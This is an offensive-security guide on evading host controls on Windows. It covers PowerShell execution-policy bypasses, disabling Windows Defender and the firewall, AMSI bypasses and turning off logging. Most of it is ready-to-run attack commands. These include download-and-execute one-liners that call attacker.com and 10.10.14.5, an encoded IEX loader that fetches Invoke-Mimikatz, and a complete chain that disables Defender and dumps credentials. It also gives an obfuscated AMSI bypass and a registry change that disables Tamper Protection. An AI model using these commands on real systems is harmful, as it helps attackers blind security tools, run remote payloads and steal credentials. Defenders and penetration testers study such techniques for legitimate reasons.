# Host-Based Security Control Evasion

### Overview

**PowerShell Execution Policy** is a security feature designed to prevent execution of untrusted scripts. However, it is NOT a security boundary—it's merely a safety mechanism to prevent accidental execution. Attackers can easily bypass execution policies through multiple methods. Combined with Windows Defender disabling techniques, these bypasses enable execution of offensive PowerShell tools and scripts on compromised systems.

**Key Concepts:**

* **Execution Policy** - Controls which scripts PowerShell will run
* **Scope Levels** - Process, CurrentUser, LocalMachine (hierarchy of policies)
* **Bypass Methods** - Multiple techniques to circumvent execution restrictions
* **Windows Defender** - Built-in antivirus and endpoint protection
* **Real-Time Protection** - Active scanning of files and processes

**Why this matters:** Execution policy bypass enables:

* Running offensive PowerShell tools (PowerView, Invoke-Mimikatz, etc.)
* Executing downloaded scripts without modification
* In-memory attacks that avoid disk-based detection
* Lateral movement with PowerShell remoting
* Post-exploitation enumeration and credential dumping

**Attack advantages:**

* Execution policy is not a security control (Microsoft explicitly states this)
* Multiple bypass methods available
* Can be bypassed without administrative privileges
* Works on all Windows versions with PowerShell
* Difficult to prevent without removing PowerShell entirely

**Common execution policies:**

* **Restricted** - No scripts allowed (default on Windows clients)
* **AllSigned** - Only scripts signed by trusted publisher
* **RemoteSigned** - Downloaded scripts must be signed (default on Windows servers)
* **Unrestricted** - All scripts allowed with warning for downloaded scripts
* **Bypass** - Nothing blocked, no warnings

***

### Exploitation Workflow Summary

1. Assess Current Policy ├─ Check execution policy settings ├─ Identify scope levels ├─ Determine restrictions └─ Plan bypass method
2. Bypass Execution Policy ├─ Choose appropriate bypass technique ├─ Execute with bypass parameters ├─ Or set policy at Process scope └─ Verify script execution works
3. Disable Windows Defender ├─ Disable real-time monitoring ├─ Disable script scanning ├─ Disable behavior monitoring └─ Disable firewall (if needed)
4. Execute Offensive Tools ├─ Import PowerShell modules ├─ Run enumeration scripts ├─ Execute credential dumping tools └─ Perform post-exploitation tasks
5. Maintain Access ├─ Keep Defender disabled ├─ Monitor for policy changes ├─ Re-apply bypasses as needed └─ Establish persistence
6. Cleanup (Optional) ├─ Re-enable Defender ├─ Restore execution policy ├─ Clear PowerShell logs └─ Remove artifacts

***

### Understanding PowerShell Execution Policy

#### What is Execution Policy

**Not a security boundary:** Microsoft documentation explicitly states that execution policy is designed to prevent users from accidentally running scripts, NOT to prevent determined attackers from running scripts.

**Security implications:**

```
Execution Policy ≠ Security Control
- Can be bypassed trivially
- Does not prevent code execution
- Only affects script files (.ps1, .psm1, etc.)
- Does not affect commands typed interactively
```

**What it actually does:**

```
Checks before running scripts:
1. Is script from trusted source?
2. Is script digitally signed?
3. Should I warn the user?
4. Should I block execution?
```

#### Execution Policy Scopes

**Scope hierarchy (most restrictive wins):**

**1. MachinePolicy (Group Policy - Computer)**

```
Set by: Domain Group Policy
Precedence: Highest (cannot be overridden)
Applies to: All users on machine
Registry: HKLM\Software\Policies\Microsoft\Windows\PowerShell
```

**2. UserPolicy (Group Policy - User)**

```
Set by: Domain Group Policy
Precedence: Second highest
Applies to: Current user
Registry: HKCU\Software\Policies\Microsoft\Windows\PowerShell
```

**3. Process**

```
Set by: Current PowerShell session
Precedence: Lowest (can always be set)
Applies to: Current process only
Duration: Until PowerShell exits
```

**4. CurrentUser**

```
Set by: Individual user
Precedence: Third
Applies to: Current user
Registry: HKCU\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
```

**5. LocalMachine**

```
Set by: Administrator
Precedence: Fourth
Applies to: All users
Registry: HKLM\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell
```

#### Checking Current Policy

**View effective policy:**

```powershell
Get-ExecutionPolicy
```

**Expected output:**

```
Restricted
```

**View all scope policies:**

```powershell
Get-ExecutionPolicy -List
```

**Expected output:**

```
        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine      Restricted
```

**What this shows:**

* **MachinePolicy/UserPolicy** - If set, indicates Group Policy control
* **Process** - Current session setting
* **CurrentUser/LocalMachine** - Persistent settings

***

### Bypass Method 1: Process Scope Override

#### Understanding Process Scope

**Why this works:** Process scope applies only to current PowerShell session and can always be set, even if Group Policy enforces restrictions.

**Limitations:**

* Requires starting new PowerShell session
* Only affects current process
* Resets when PowerShell closes
* Can still be blocked by AppLocker/WDAC

#### Interactive Bypass

**Method 1: Set-ExecutionPolicy with Process scope**

```powershell
Set-ExecutionPolicy Bypass -Scope Process
```

**Expected prompt:**

```
Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https://go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
```

**Response:** Type `A` (Yes to All)

**Verification:**

```powershell
Get-ExecutionPolicy
```

**Output:**

```
Bypass
```

**Now execute scripts:**

```powershell
.\script.ps1
```

#### Silent Bypass (No Prompt)

**Method 2: Set policy with -Force**

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force
```

**No confirmation prompt displayed.**

**Verify and execute:**

```powershell
Get-ExecutionPolicy
# Output: Bypass

.\PowerView.ps1
```

***

### Bypass Method 2: Command-Line Parameters

#### ExecutionPolicy Parameter

**Most common bypass method:**

```powershell
powershell -ExecutionPolicy Bypass
```

**What this does:**

* Launches new PowerShell process
* Sets execution policy to Bypass for that process
* No changes to system policy
* No confirmation required

**Execute script directly:**

```powershell
powershell -ExecutionPolicy Bypass -File script.ps1
```

**With command:**

```powershell
powershell -ExecutionPolicy Bypass -Command "Import-Module .\PowerView.ps1; Get-DomainUser"
```

#### Short Form (-ep)

**Abbreviated parameter:**

```cmd
powershell -ep bypass
```

**Example usage:**

```cmd
C:\Users\Administrator\Downloads>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Administrator\Downloads> . .\PowerView.ps1
PS C:\Users\Administrator\Downloads> Get-DomainUser
```

**Why this works:** PowerShell supports parameter abbreviation. `-ep` is short for `-ExecutionPolicy`.

#### Unrestricted Policy

**Alternative policy:**

```powershell
powershell -ExecutionPolicy Unrestricted -File script.ps1
```

**Difference from Bypass:**

* **Unrestricted** - Warns before running downloaded scripts
* **Bypass** - No warnings, executes everything

***

### Bypass Method 3: Single Command Execution

#### Command Parameter

**Execute command without script file:**

```powershell
powershell -c "Get-Process"
```

**Parameters:**

* `-c` or `-Command` - Execute command and exit

**Download and execute in memory:**

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')"
```

**Why this works:** Execution policy only applies to script files, not commands typed or passed via `-Command`.

**Multi-line commands:**

```powershell
powershell -c "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties *"
```

#### IEX (Invoke-Expression) Pattern

**Common attack pattern:**

```powershell
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1'); Get-DomainUser"
```

**What this does:**

1. Download script from web server
2. Execute script in memory (never touches disk)
3. Run commands from loaded module
4. No script file = execution policy doesn't apply

**AMSI considerations:** Modern Windows may detect this pattern. See bypass techniques below.

***

### Bypass Method 4: Encoded Commands

#### EncodedCommand Parameter

**Encode PowerShell command:**

```powershell
# Original command
$command = "Get-Process"

# Encode to Base64
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Output encoded command
$encodedCommand
```

**Expected output:**

```
RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
```

**Execute encoded command:**

```powershell
powershell -EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==
```

**Why this works:**

* Encoded commands bypass execution policy
* Obfuscates command from casual inspection
* Can bypass some basic detection

#### Encoding Complex Scripts

**Encode script with IEX:**

```powershell
$command = "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command privilege::debug"

$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand
```

**Execute:**

```powershell
powershell -EncodedCommand <base64_string>
```

**Combine with other bypasses:**

```powershell
powershell -ep bypass -EncodedCommand <base64_string>
```

***

### Bypass Method 5: Environment Variable

#### PSExecutionPolicyPreference

**Set environment variable:**

```powershell
$env:PSExecutionPolicyPreference="Bypass"
```

**What this does:**

* Sets execution policy for current session
* Overrides all other scope settings
* Works without admin privileges
* Only affects current PowerShell process

**Verify:**

```powershell
Get-ExecutionPolicy
```

**Output:**

```
Bypass
```

**Execute scripts:**

```powershell
.\script.ps1
# Executes without error
```

#### Combining with Script Execution

**One-liner:**

```powershell
$env:PSExecutionPolicyPreference="Bypass"; .\script.ps1
```

**In attack scenario:**

```powershell
$env:PSExecutionPolicyPreference="Bypass"
Import-Module .\PowerView.ps1
Get-DomainUser
```

***

### Additional Bypass Methods

#### Method 6: Read and Pipe to PowerShell

**Read script content, pipe to PowerShell:**

```powershell
Get-Content .\script.ps1 | powershell.exe -noprofile -
```

**Why this works:** Script content is piped to stdin, not executed as a file.

#### Method 7: Invoke-Command

**Execute script block:**

```powershell
Invoke-Command -ScriptBlock {Get-Process}
```

**Load script into script block:**

```powershell
Invoke-Command -ScriptBlock ([ScriptBlock]::Create((Get-Content .\script.ps1 -Raw)))
```

#### Method 8: Download and Execute

**DownloadString to IEX:**

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

**DownloadFile then execute:**

```powershell
(New-Object Net.WebClient).DownloadFile('http://attacker.com/script.ps1', 'C:\temp\script.ps1')
powershell -ep bypass -File C:\temp\script.ps1
```

#### Method 9: Invoke-Expression with Get-Content

**Read and execute:**

```powershell
IEX(Get-Content .\script.ps1 -Raw)
```

#### Method 10: Registry Modification

**Modify LocalMachine policy (requires admin):**

```powershell
Set-ItemProperty -Path "HKLM:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Bypass"
```

**Modify CurrentUser policy:**

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -Name "ExecutionPolicy" -Value "Bypass"
```

**Verify:**

```powershell
Get-ExecutionPolicy -List
```

***

### Disabling Windows Defender

#### Understanding Windows Defender Components

**Key protection features:**

**1. Real-Time Protection**

```
Monitors:
- File system activity
- Process creation
- Network connections
- Registry modifications
```

**2. Script Scanning**

```
Analyzes:
- PowerShell scripts
- JavaScript/VBScript
- Batch files
- Command-line arguments
```

**3. Behavior Monitoring**

```
Detects:
- Suspicious process behavior
- Credential dumping patterns
- Injection techniques
- Persistence mechanisms
```

**4. IOAV Protection (IE/Office AV)**

```
Scans:
- Downloaded files
- Email attachments
- Office macro documents
```

**5. Intrusion Prevention System**

```
Blocks:
- Network-based exploits
- Known attack patterns
- Malicious traffic
```

#### Disabling Real-Time Monitoring

**Method 1: Set-MpPreference (PowerShell)**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

**Expected result:** Real-time protection disabled temporarily (until reboot or manual re-enable).

**Verify status:**

```powershell
Get-MpPreference | Select-Object DisableRealtimeMonitoring
```

**Expected output:**

```
DisableRealtimeMonitoring
-------------------------
                     True
```

**Method 2: From Command Prompt**

```cmd
powershell Set-MpPreference -DisableRealtimeMonitoring $true
```

#### Comprehensive Defender Disable

**Disable all protection features:**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
```

**Parameters explained:**

* `-DisableRealtimeMonitoring $true` - Disable real-time file scanning
* `-DisableScriptScanning $true` - Disable PowerShell/script scanning
* `-DisableBehaviorMonitoring $true` - Disable behavior-based detection
* `-DisableIOAVProtection $true` - Disable IE/Office file scanning
* `-DisableIntrusionPreventionSystem $true` - Disable network IPS

**Verify all disabled:**

```powershell
Get-MpPreference | Select-Object Disable*
```

**Expected output:**

```
DisableRealtimeMonitoring       : True
DisableScriptScanning           : True
DisableBehaviorMonitoring       : True
DisableIOAVProtection           : True
DisableIntrusionPreventionSystem: True
```

#### Adding Exclusions

**Exclude path from scanning:**

```powershell
Add-MpPreference -ExclusionPath "C:\temp"
```

**Exclude file extension:**

```powershell
Add-MpPreference -ExclusionExtension "exe","dll"
```

**Exclude process:**

```powershell
Add-MpPreference -ExclusionProcess "mimikatz.exe"
```

**Verify exclusions:**

```powershell
Get-MpPreference | Select-Object Exclusion*
```

***

### Disabling Windows Firewall

#### Understanding Firewall Profiles

**Three firewall profiles:**

**1. Domain Profile**

```
Active when: Connected to domain network
Default: Usually allows domain traffic
```

**2. Private Profile**

```
Active when: Connected to private network
Default: Moderate restrictions
```

**3. Public Profile**

```
Active when: Connected to public network
Default: Most restrictive
```

#### Disabling All Profiles

**PowerShell command:**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Parameters:**

* `-Profile Domain,Public,Private` - All three profiles
* `-Enabled False` - Disable firewall

**Verify status:**

```powershell
Get-NetFirewallProfile | Select-Object Name,Enabled
```

**Expected output:**

```
Name    Enabled
----    -------
Domain    False
Private   False
Public    False
```

#### Alternative Methods

**Using netsh (backward compatibility):**

```cmd
netsh advfirewall set allprofiles state off
```

**Disable specific profile:**

```cmd
netsh advfirewall set domainprofile state off
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
```

**Verify with netsh:**

```cmd
netsh advfirewall show allprofiles
```

***

### Practical Attack Scenario

#### Complete Bypass and Tool Execution

**Step 1: Bypass execution policy**

```powershell
powershell -ep bypass
```

**Step 2: Disable Defender**

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true
```

**Step 3: Disable Firewall**

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

**Step 4: Import PowerView**

```powershell
. .\PowerView.ps1
```

**Step 5: Execute enumeration**

```powershell
Get-DomainUser
Get-DomainComputer
Get-DomainGroup
```

#### Loading Invoke-Mimikatz

**Complete attack chain:**

```powershell
# Bypass execution policy
$env:PSExecutionPolicyPreference="Bypass"

# Disable Defender
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true

# Download and execute Invoke-Mimikatz
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')

# Dump credentials
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

***

### Detection Evasion

#### AMSI Bypass

**Understanding AMSI:** Anti-Malware Scan Interface inspects PowerShell script content before execution.

**Simple AMSI bypass (may be patched):**

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Obfuscated AMSI bypass:**

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$f.SetValue($null,[IntPtr]0)
```

#### Event Log Considerations

**PowerShell logs to monitor:**

```
Event ID 4103: Module Logging
Event ID 4104: Script Block Logging
Event ID 4105: Script Block Logging (Start)
Event ID 4106: Script Block Logging (Stop)
```

**Disable script block logging (requires admin):**

```powershell
Set-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

***

### Defender Removal Tools

#### Windows Defender Remover

**Tool capabilities:**

* Completely removes Windows Defender
* More permanent than disabling
* Requires administrator privileges
* May break Windows Update

**Usage considerations:**

* Use only in isolated lab environments
* May cause system instability
* Difficult to reinstall Defender
* Detection by EDR solutions

#### Defendnot

**Tool capabilities:**

* Disables Defender services
* Prevents Defender from starting
* Modifies Defender configuration
* Removes Defender definitions

**Attack workflow:**

```
1. Execute Defendnot on target
2. Verify Defender fully disabled
3. Execute offensive tools
4. Optionally restore Defender before cleanup
```

***

### Troubleshooting

#### Error: "Execution policy change blocked by Group Policy"

**Problem:** Cannot change execution policy

```
Set-ExecutionPolicy : Windows PowerShell updated your execution policy successfully, but the setting is
overridden by a policy defined at a more specific scope.
```

**Cause:** Group Policy enforces execution policy

**Solution:** Use bypass methods that don't modify policy:

```powershell
# Method 1: Command-line parameter
powershell -ep bypass -File script.ps1

# Method 2: Environment variable
$env:PSExecutionPolicyPreference="Bypass"

# Method 3: Read and execute
Get-Content script.ps1 | powershell -noprofile -
```

#### Error: "Set-MpPreference : Access Denied"

**Problem:** Cannot disable Defender

```
Set-MpPreference : Access is denied.
```

**Cause:** Requires administrator privileges

**Solution:**

```powershell
# Run PowerShell as Administrator
# Right-click PowerShell → Run as Administrator

# Or from elevated prompt
Start-Process powershell -Verb RunAs
```

#### Error: "This script contains malicious content"

**Problem:** AMSI blocks script execution

**Cause:** AMSI detected known malicious patterns

**Solution:**

```powershell
# Bypass AMSI first
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Then execute script
. .\script.ps1
```

#### Defender Re-enables Automatically

**Problem:** Defender turns back on

**Cause:** Tamper Protection enabled

**Solution:**

```powershell
# Disable Tamper Protection (requires GUI or registry)
# GUI: Windows Security → Virus & threat protection → Manage settings → Tamper Protection OFF

# Registry method (requires admin)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0
```

***

### Quick Reference

#### Execution Policy Bypasses

```powershell
# Method 1: Process scope
Set-ExecutionPolicy Bypass -Scope Process -Force

# Method 2: Command-line parameter
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass

# Method 3: Single command
powershell -c "Get-Process"

# Method 4: Encoded command
powershell -EncodedCommand <base64>

# Method 5: Environment variable
$env:PSExecutionPolicyPreference="Bypass"

# Method 6: Read and pipe
Get-Content script.ps1 | powershell -noprofile -

# Method 7: IEX with Get-Content
IEX(Get-Content script.ps1 -Raw)

# Method 8: Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')
```

#### Disable Windows Defender

```powershell
# Comprehensive disable
Set-MpPreference -DisableRealtimeMonitoring $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true

# Add exclusions
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionExtension "exe"
Add-MpPreference -ExclusionProcess "tool.exe"

# Verify status
Get-MpPreference | Select-Object Disable*
```

#### Disable Windows Firewall

```powershell
# Disable all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Using netsh
netsh advfirewall set allprofiles state off

# Verify
Get-NetFirewallProfile | Select-Object Name,Enabled
```

#### AMSI Bypass

```powershell
# Simple bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Verify bypass worked
'amsiutils' # Should not trigger detection
```

#### Check Current Status

```powershell
# Execution policy
Get-ExecutionPolicy
Get-ExecutionPolicy -List

# Defender status
Get-MpPreference | Select-Object Disable*
Get-MpComputerStatus

# Firewall status
Get-NetFirewallProfile | Select-Object Name,Enabled
```

###
